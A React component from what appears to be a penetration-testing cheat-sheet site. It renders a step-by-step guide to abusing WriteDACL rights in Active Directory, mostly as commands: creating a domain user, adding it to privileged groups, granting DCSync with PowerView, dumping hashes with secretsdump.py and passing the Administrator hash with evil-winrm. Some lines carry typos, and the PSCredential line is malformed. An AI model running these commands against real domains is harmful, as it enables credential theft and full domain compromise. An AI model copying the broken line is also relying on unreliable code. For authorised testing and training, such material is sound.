import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const WriteDACL = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Requirements</Typography>
            <Typography>
              The account needs to have WriteDACL permission.
            </Typography>
            <Image
              src="/writedacl.png"
              height={134}
              width={479}
              priority={true}
            />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Description</Typography>
            <Typography>
              We have the ability to write new Account Control Entries (ACEs) to
              the target object's Discretionary Access Control List (DACL). This
              means that we can add a user to this group and give them DCSync
              privileges. DCSync privileges can be given by adding the user to
              the "Exchange Windows Permissions" group.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>Create a new user.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"net user shelled abc123! /add /domain"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              Add user to "Exchange Windows Permissions" group to give user
              DCSync permission. Also add user to "Remote Mannagement Users"
              localgroup to remote into the user's account.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {'net group "Exchange Windows Permissions" shelled /add'}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {'net localgroup "Remote Management Users" shelled /add'}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>Import PowerView to perform the exploit.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"Import-Module PowerView.ps1"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"$pass = convertto-securestring 'abc123!' -asplain -force"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "$cred = new-object system.management.automation.pscredential('{DOMAIN}\\shelled, $pass')"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "Add-ObjectACL -PrincipalIdentity shelled -Credential $cred -Rights DCSync"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              Use Secretsdump.py to get the Administrator's hash.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"secretsdump.py {DOMAIN}\\shelled@{IP}"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>
              Perform a Pass-the-Hack attack to login as Administrator.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"evil-winrm -H {NTLM_HASH} -u Administrator -i {IP}"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default WriteDACL;
